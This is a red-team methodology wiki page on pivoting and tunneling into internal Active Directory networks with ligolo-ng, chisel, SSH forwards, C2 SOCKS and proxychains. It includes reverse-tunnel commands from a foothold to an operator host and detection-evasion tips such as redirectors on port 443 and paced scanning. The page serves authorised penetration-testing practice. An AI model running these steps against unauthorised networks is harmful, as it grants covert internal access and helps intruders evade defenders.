---
title: "Pivoting & Tunneling (the operator-side plumbing)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [red-team, pivoting, tunneling, socks, ligolo, chisel, opsec]
---

# Pivoting & Tunneling

Almost every AD command in this wiki is prefixed "run it from the **Linux
operator host over the tunnel**." This page is *how you build that tunnel* — the
plumbing that turns a single foothold into network reach so Impacket, Certipy,
[[netexec]] and bloodhound-python can hit an internal domain. The companion page
[[c2-and-pivoting-ad]] covers *using* AD tooling once the tunnel exists; this one
is the transport itself, part of the [[redteam-ad-methodology]] flow.

## The model: one entry, a SOCKS proxy, everything through it

A foothold on an internal host exposes a **SOCKS5 proxy** back to you.
Everything else (scanners, AD tools, exec) rides that proxy — you never touch the
target's disk with your tooling. Two layers to get right:

1. **The pivot tool** that creates the tunnel (ligolo-ng / chisel / SSH / C2
   built-in).
2. **proxychains / proxy-aware tools** that route your Linux tooling into it.

## Pivot tools (ranked by how you'll actually use them)

### ligolo-ng — the modern default

ligolo-ng doesn't use SOCKS at all; it creates a **TUN interface** on your box,
so the target subnet becomes *routable* like a VPN — no proxychains, no
"proxychains-only" tool breakage, handles UDP and ICMP.

```bash
# Operator (proxy/relay side):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                         # listens :11601 for agents

# On the foothold (agent), pointed back at you (often through your C2/redirector):
./agent -connect OPERATOR_IP:11601 -ignore-cert

# In the ligolo console: pick the session, then add a route to the internal net
session                                   # select the agent
ifconfig                                  # see the agent's networks
# operator shell:  sudo ip route add 10.0.0.0/24 dev ligolo
start                                     # tunnel up -> 10.0.0.0/24 now routable
```

Now **any** tool works with no proxychains: `nxc smb 10.0.0.0/24`,
`certipy find -dc-ip 10.0.0.10 ...`, `xfreerdp /v:10.0.0.20`. Double-pivot: run a
second agent on a host in the *next* segment and `listener_add` / route again.
`ligolo` also does **local port forwards** for single services.

### chisel — when you only have HTTP egress

chisel tunnels SOCKS over HTTP/WebSocket — good when the only way out is
web-proxy-friendly ports (80/443). It's a classic SOCKS pivot, so it *does* need
proxychains for most tools.

```bash
# Operator (server):
./chisel server -p 8080 --reverse
# Foothold (client) -> reverse SOCKS5 back to the operator on :1080
./chisel client OPERATOR_IP:8080 R:1080:socks
# then: proxychains nxc smb 10.0.0.0/24
```

### SSH dynamic forward — when you have SSH creds on a pivot

```bash
ssh -D 1080 -N -f user@pivot        # dynamic SOCKS5 on :1080 through the pivot
ssh -L 3389:10.0.0.20:3389 user@pivot   # local forward one service (RDP)
```
Zero extra tooling, fully encrypted, blends with legit admin SSH. Only works
where you hold SSH access to a reachable host.

### C2 built-in SOCKS (Cobalt Strike / Meterpreter)

Your beacon already is the pivot — expose its SOCKS and route in. This is the
[[c2-and-pivoting-ad]] path; the beacon's noise profile is [[beaconing]],
frameworks [[cobalt-strike]] / [[meterpreter]].

```
# Cobalt Strike:  socks 1080         (then proxychains on the team server host)
# Meterpreter:    run autoroute -s 10.0.0.0/24 ; then socks proxy aux module
```

## proxychains (for the SOCKS-based pivots)

```conf
# /etc/proxychains.conf  (or proxychains4.conf)
strict_chain          # or dynamic_chain if you chain multiple hops
proxy_dns             # resolve names THROUGH the tunnel (critical for Kerberos SPNs)
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains nxc smb 10.0.0.0/24
proxychains bloodhound-python -u user -p 'Pass' -d corp.local -ns 10.0.0.10 -c DCOnly
proxychains certipy find -u user@corp.local -p 'Pass' -dc-ip 10.0.0.10
```
`proxy_dns` matters: Kerberos binds to **hostnames/SPNs**, so name resolution
must happen inside the target network — or set `/etc/hosts` for the DC/targets by
hand. See the "Kerberos over the tunnel" notes in [[c2-and-pivoting-ad]].

## Gotchas that eat hours

- **proxychains + tools that fork/scan aggressively** (nmap SYN, raw sockets)
  break — use `nmap -sT -Pn` (full-connect) through SOCKS, or better, ligolo's
  TUN so nmap works natively.
- **Kerberos over SOCKS**: clock skew (`KRB_AP_ERR_SKEW`) and DNS are the two
  killers — sync time to the DC, resolve by name. ([[ticket-and-credential-opsec]])
- **UDP** (DNS, some Kerberos, mitm6) doesn't traverse a plain SOCKS4 proxy —
  ligolo (TUN) or a UDP-capable relay only.
- **Double NAT / asymmetric routes**: prefer **reverse** connections (agent dials
  out to you) — internal hosts rarely accept inbound, but egress to 443 is usually
  allowed.

## Red-team notes (OPSEC)

- **Egress shape is the tell.** A long-lived tunnel to a novel external IP over a
  weird port screams. Ride 443 to a **redirector** with a plausible profile, or
  route the agent through your existing C2 channel so there's one egress, not two.
- **ligolo's TUN is quiet on the wire** (looks like the agent's normal C2), but
  the *internal scanning you do through it* is what gets caught — pace nmap/nxc
  sweeps, don't blast /16s.
- **Keep tooling off the endpoint.** The whole point of piping AD tools over the
  tunnel is that Impacket/Certipy never run on the Windows host — the endpoint
  only sees the agent process and normal-looking SMB/LDAP/Kerberos *traffic* to
  the DC, not the tool. The tunnel hides the tool, not the traffic
  ([[defense-evasion-ad]]).
- **Tear down cleanly.** Remove routes/TUN, kill agents; a dangling ligolo route
  or a listening chisel is both an artifact and a foothold for the next person.

## Related

- Using AD tooling over the tunnel: [[c2-and-pivoting-ad]].
- The enum you run first through it: [[ad-enumeration]].
- Exec once you can reach a host: [[remote-execution]], [[kerberos-double-hop]].
- Beacon/egress noise: [[beaconing]], [[defense-evasion-ad]].
